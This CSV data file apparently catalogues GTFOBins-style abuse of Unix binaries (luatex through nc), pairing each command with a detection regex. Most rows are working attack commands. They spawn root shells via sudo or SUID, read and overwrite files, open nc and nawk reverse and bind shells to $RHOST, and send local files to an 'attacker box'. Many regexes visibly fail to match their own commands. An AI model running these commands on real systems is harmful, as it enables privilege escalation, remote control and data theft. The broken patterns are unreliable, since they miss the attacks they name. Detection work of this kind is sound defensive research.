luatex,shell,"luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?luatex\s+(?:/bin/(?:sh|bash))),
luatex,sudo,"sudo luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?luatex\s+(?:/bin/(?:sh|bash))),
luatex,limited-suid,"./luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?luatex\s+(?:/bin/(?:sh|bash))),
lwp-download,file-download,lwp-download $URL $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lwp\-download\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
lwp-download,sudo,sudo lwp-download $URL $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lwp\-download\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
lwp-download,file-read,"lwp-download ""file://$LFILE"" $TF
cat $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lwp\-download\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file path must be absolute.
lwp-download,file-write,"echo DATA >$TF
lwp-download file://$TF $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lwp\-download\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
lwp-request,file-read,"lwp-request ""file://$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lwp\-request\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
lwp-request,sudo,"sudo lwp-request ""file://$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?lwp\-request\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mail,shell,mail --exec='!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mail\s*\-\-exec\s+(?:/bin/(?:sh|bash))),GNU version only.
mail,shell,"echo ""From nobody@localhost $(date)"" > $TF
mail -f $TF
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mail\s*\-f\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This creates a valid Mbox file which may be required by the binary.
mail,sudo,sudo mail --exec='!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mail\s*\-\-exec\s+(?:/bin/(?:sh|bash))),GNU version only.
make,shell,"make -s --eval=$'x:\n\t-'""$COMMAND""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?make\s*\-s\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
make,file-write,"make -s --eval=""\$(file >$LFILE,DATA)"" .","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?make\s*\-s\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Requires a newer GNU `make` version.
make,suid,"./make -s --eval=$'x:\n\t-'""$COMMAND""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?make\s*\-s\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
make,sudo,"sudo make -s --eval=$'x:\n\t-'""$COMMAND""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?make\s*\-s\s*\-\-eval\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
man,shell,"man man
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?man\s+(?:/bin/(?:sh|bash))),
man,shell,man '-H/bin/sh #' man,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?man\s+(?:/bin/(?:sh|bash))),This only works for GNU `man` and requires GNU `troff` (`groff` to be installed).
man,file-read,man file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?man\s+.+),
man,sudo,"sudo man man
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?man\s+(?:/bin/(?:sh|bash))),
mawk,shell,"mawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mawk,file-write,"mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mawk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mawk,file-read,"mawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mawk,suid,"./mawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mawk,sudo,"sudo mawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mawk,limited-suid,"./mawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
minicom,shell,minicom -D /dev/null,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?minicom\s*\-D\s+.+),"Start the following command to open the TUI interface, then:
1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.
"
minicom,shell,"echo ""! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)"" >$TF
minicom -D /dev/null -S $TF
reset^J","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?minicom\s*\-D\s*\-S\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","After the shell, exit with `Ctrl-A x`.
"
minicom,sudo,sudo minicom -D /dev/null,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?minicom\s*\-D\s+.+),"Start the following command to open the TUI interface, then:
1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.
"
minicom,suid,./minicom -D /dev/null,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?minicom\s*\-D\s+.+),"Start the following command to open the TUI interface, then:
1. press `Ctrl-A o` and select `Filenames and paths`;
2. press `e`, type `/bin/sh -p`, then `Enter`;
3. Press `Esc` twice;
4. Press `Ctrl-A k` to drop the shell.
After the shell, exit with `Ctrl-A x`.
"
more,shell,!/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?more\s+(?:/bin/(?:sh|bash))),
more,file-read,more file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?more\s+.+),
more,suid,./more file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?more\s+.+),
more,sudo,!/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?more\s+(?:/bin/(?:sh|bash))),
mosquitto,file-read,"mosquitto -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mosquitto\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mosquitto,suid,"./mosquitto -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mosquitto\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mosquitto,sudo,"sudo mosquitto -c ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mosquitto\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mount,sudo,"sudo mount -o bind /bin/sh /bin/mount
sudo mount",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mount\s*\-o\s+(?:/bin/(?:sh|bash))),Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.
msfconsole,shell,"sudo msfconsole
msf6 > irb
>> system(""/bin/sh"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msfconsole\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
msfconsole,sudo,"sudo msfconsole
msf6 > irb
>> system(""/bin/sh"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msfconsole\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)))",
msgattrib,file-read,msgattrib -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgattrib\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgattrib,sudo,sudo msgattrib -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgattrib\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgattrib,suid,./msgattrib -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgattrib\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgcat,file-read,msgcat -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgcat\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgcat,sudo,sudo msgcat -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgcat\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgcat,suid,./msgcat -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgcat\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgconv,file-read,msgconv -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgconv,sudo,sudo msgconv -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgconv,suid,./msgconv -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgfilter,shell,echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
msgfilter,file-read,"msgfilter -P -i ""LFILE"" /bin/cat","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-i\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program."
msgfilter,sudo,echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
msgfilter,suid,echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgfilter\s*\-P\s*\-p\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.
msgmerge,file-read,msgmerge -P $LFILE /dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgmerge\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgmerge,sudo,sudo msgmerge -P $LFILE /dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgmerge\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msgmerge,suid,./msgmerge -P $LFILE /dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msgmerge\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msguniq,file-read,msguniq -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msguniq\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msguniq,sudo,sudo msguniq -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msguniq\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
msguniq,suid,./msguniq -P $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?msguniq\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mtr,file-read,"mtr --raw -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mtr\s*\-\-raw\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mtr,sudo,"sudo mtr --raw -F ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mtr\s*\-\-raw\s*\-F\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
multitime,shell,multitime /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?multitime\s+(?:/bin/(?:sh|bash))),
multitime,suid,./multitime /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?multitime\s*\-p\s+(?:/bin/(?:sh|bash))),
multitime,sudo,sudo multitime /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?multitime\s+(?:/bin/(?:sh|bash))),
mv,suid,"echo ""DATA"" > $TF
./mv $TF $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mv\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mv,sudo,"echo ""DATA"" > $TF
sudo mv $TF $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mv\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
mysql,shell,mysql -e '\! /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mysql\s*\-e\s+(?:/bin/(?:sh|bash))),
mysql,sudo,sudo mysql -e '\! /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mysql\s*\-e\s+(?:/bin/(?:sh|bash))),
mysql,limited-suid,./mysql -e '\! /bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mysql\s*\-e\s+(?:/bin/(?:sh|bash))),
mysql,library-load,mysql --default-auth ../../../../../path/to/lib,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?mysql\s*\-\-default\-auth\s+.+),"A MySQL server must accept connections in order for this to work.

The following loads the `/path/to/lib.so` shared object.
"
nano,shell,"nano
^R^X
reset; sh 1>&0 2>&0",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s+.+),
nano,shell,"nano -s /bin/sh
/bin/sh
^T",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s*\-s\s+(?:/bin/(?:sh|bash))),The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
nano,file-write,"nano file_to_write
DATA
^O","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nano,file-read,nano file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s+.+),
nano,limited-suid,"./nano -s /bin/sh
/bin/sh
^T",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s*\-s\s+(?:/bin/(?:sh|bash))),The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
nano,sudo,"sudo nano
^R^X
reset; sh 1>&0 2>&0",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nano\s+.+),
nasm,file-read,nasm -@ $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nasm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nasm,suid,./nasm -@ $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nasm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nasm,sudo,sudo nasm -@ $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nasm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,shell,"nawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,non-interactive-reverse-shell,"nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s*\-v\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
nawk,non-interactive-bind-shell,"nawk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
nawk,file-write,"nawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,file-read,"nawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,suid,"./nawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,sudo,"sudo nawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nawk,limited-suid,"./nawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
nc,reverse-shell,nc -e /bin/sh $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
nc,bind-shell,nc -l -p $LPORT -e /bin/sh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-l\s*\-p\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.
nc,file-upload,"nc $RHOST $RPORT < ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file."
nc,file-download,"nc -l -p $LPORT > ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-l\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file."
nc,sudo,sudo nc -e /bin/sh $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
nc,limited-suid,./nc -e /bin/sh $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?nc\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.
